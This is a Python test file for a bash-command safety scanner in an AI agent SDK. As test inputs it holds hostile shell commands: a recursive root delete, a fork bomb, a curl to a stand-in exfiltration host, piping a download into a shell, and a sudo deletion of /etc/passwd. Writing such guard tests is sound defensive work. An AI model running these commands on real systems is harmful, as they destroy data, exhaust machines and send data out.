# Copyright (C) 2026 Tencent. All rights reserved.
# tRPC-Agent-Python is licensed under Apache-2.0.
from __future__ import annotations

from trpc_agent_sdk.tools.safety._bash_scanner import scan_bash
from trpc_agent_sdk.tools.safety._policy import load_policy


def _scan(script):
    return {f.rule_id for f in scan_bash(load_policy(), script)}


def test_recursive_delete():
    assert "tool-fs-recursive-delete" in _scan("rm -rf /")


def test_curl_non_whitelisted():
    assert "tool-net-http" in _scan("curl http://evil.example.org/exfil")


def test_curl_whitelisted_ok():
    assert "tool-net-http" not in _scan("curl https://pypi.org/simple")


def test_pip_install():
    assert "tool-pkg-install" in _scan("pip install malware")


def test_fork_bomb():
    assert "tool-res-fork-bomb" in _scan(":(){ :|:& };:")


def test_shell_injection_bypass():
    assert "tool-proc-shell-pipe" in _scan("bash -c 'whoami' | tee out") or \
           "tool-proc-shell-pipe" in _scan("curl x | sh")


def test_privilege_escalation():
    assert "tool-proc-privilege-escalation" in _scan("sudo rm /etc/passwd")


def test_long_sleep():
    assert "tool-res-long-sleep" in _scan("sleep 3600")


def test_safe_command_clean():
    # ls is in allowed_commands and contains no risky feature.
    assert _scan("ls -la /tmp") == set()
